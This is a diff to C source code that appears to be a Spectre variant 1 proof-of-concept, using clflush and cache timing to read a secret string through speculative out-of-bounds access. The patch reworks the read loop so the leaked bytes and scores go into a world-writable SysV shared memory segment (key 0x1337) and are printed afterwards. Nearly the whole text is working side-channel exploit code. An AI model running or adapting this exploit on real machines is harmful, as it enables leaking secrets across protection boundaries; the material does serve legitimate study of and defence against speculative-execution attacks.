@@ -21,6 +21,8 @@
 #include <x86intrin.h> /* for rdtsc, rdtscp, clflush */
 #endif /* ifdef _MSC_VER */
 
+#include <sys/shm.h>
+
 /* Automatically detect if SSE2 is not available when SSE is advertized */
 #ifdef _MSC_VER
 /* MSC */
@@ -159,7 +161,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #ifndef NOCLFLUSH
     /* Flush array2[512*(0..255)] from cache */
     for (i = 0; i < 256; i++)
-      _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
+      _mm_clflush((void const*) & array2[i * 512]); /* intrinsic for clflush instruction */
 #else
     /* Flush array2[256*(0..255)] from cache
        using long SSE instruction several times */
@@ -291,11 +293,22 @@ int main(int argc,
   size_t malicious_x = (size_t)(secret - (char * ) array1);
   
   /* Default addresses to read is 40 (which is the length of the secret string) */
-  int len = 40;
+  const int total_len = 40;
+  int len = total_len;
   
   int score[2];
   uint8_t value[2];
   int i;
+
+  struct item {
+    int score[2];
+    uint8_t value[2];
+  };
+
+  key_t shm_key = 0x1337;
+  const int shared_segment_size = sizeof(struct item) * total_len;
+  int segment_id;
+  char* shared_memory;
 
   #ifdef NOCLFLUSH
   for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
@@ -322,6 +335,30 @@ int main(int argc,
     malicious_x -= (size_t) array1;
 
     sscanf(argv[3], "%d", &len);
+  }
+
+  size_t malicious_x_0 = malicious_x;
+
+  segment_id = shmget(shm_key, shared_segment_size, IPC_CREAT | 0777);
+  if(segment_id < 0) {
+    return 1;
+  }
+  shared_memory = (char*)shmat(segment_id, 0, 0);
+  if(shared_memory == (char*)(-1)) {
+    return 1;
+  }
+
+  struct item* pitem = (struct item*)shared_memory;
+
+  /* Start the read loop to read each address */
+  while (--len >= 0) {
+    /* Call readMemoryByte with the required cache hit threshold and
+       malicious x address. value and score are arrays that are
+       populated with the results.
+    */
+    readMemoryByte(cache_hit_threshold, malicious_x++, pitem->value, pitem->score);
+
+    pitem++;
   }
 
   /* Print git commit hash */
@@ -362,29 +399,32 @@ int main(int argc,
 
   printf("\n");
 
+  pitem = (struct item*)shared_memory;
+
+  len = total_len;
+  malicious_x = malicious_x_0;
+
   printf("Reading %d bytes:\n", len);
-
-  /* Start the read loop to read each address */
-  while (--len >= 0) {
+  while (--len>=0) {
     printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
-
-    /* Call readMemoryByte with the required cache hit threshold and
-       malicious x address. value and score are arrays that are
-       populated with the results.
-    */
-    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
+    malicious_x++;
 
     /* Display the results */
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+    printf("%s: ", (pitem->score[0] >= 2 * pitem->score[1] ? "Success" : "Unclear"));
+    printf("0x%02X=’%c’ score=%d ", pitem->value[0],
+      (pitem->value[0] > 31 && pitem->value[0] < 127 ? pitem->value[0] : '?'), pitem->score[0]);
     
-    if (score[1] > 0) {
-      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
-      (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+    if (pitem->score[1] > 0) {
+      printf("(second best: 0x%02X=’%c’ score=%d)", pitem->value[1],
+      (pitem->value[1] > 31 && pitem->value[1] < 127 ? pitem->value[1] : '?'), pitem->score[1]);
     }
 
     printf("\n");
+    pitem++;
   }
+
+  shmdt(shared_memory);
+  shmctl(segment_id, IPC_RMID, NULL);
+
   return (0);
 }
